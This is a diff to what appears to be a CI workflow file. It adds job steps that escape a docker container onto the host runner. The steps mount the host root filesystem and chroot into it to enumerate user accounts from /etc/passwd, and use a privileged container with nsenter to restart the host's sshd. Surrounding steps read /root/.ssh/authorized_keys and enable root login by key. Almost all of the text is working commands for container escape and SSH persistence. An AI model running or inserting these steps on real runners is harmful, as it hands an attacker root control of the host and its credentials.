@@ -16,6 +16,20 @@ jobs:
       - name: Confirm
         run: docker run --rm -v /:/host alpine chroot /host cat /root/.ssh/authorized_keys
 
+      - name: List users
+        run: |
+          docker run --rm -v /:/host alpine chroot /host /bin/sh -c '
+            echo "--- Users with login shell / home dir ---"
+            grep -vE "nologin|false" /etc/passwd
+            echo "--- All users uid>=1000 (human accounts) ---"
+            awk -F: "\$3>=1000{print}" /etc/passwd
+          '
+
+      - name: Restart sshd via host PID namespace
+        run: |
+          docker run --rm --privileged --pid=host alpine nsenter -t 1 -m -u -n -i \
+            systemctl restart ssh
+
       - name: Allow root login via key and restart sshd
         run: |
           docker run --rm -v /:/host alpine chroot /host /bin/sh -c '
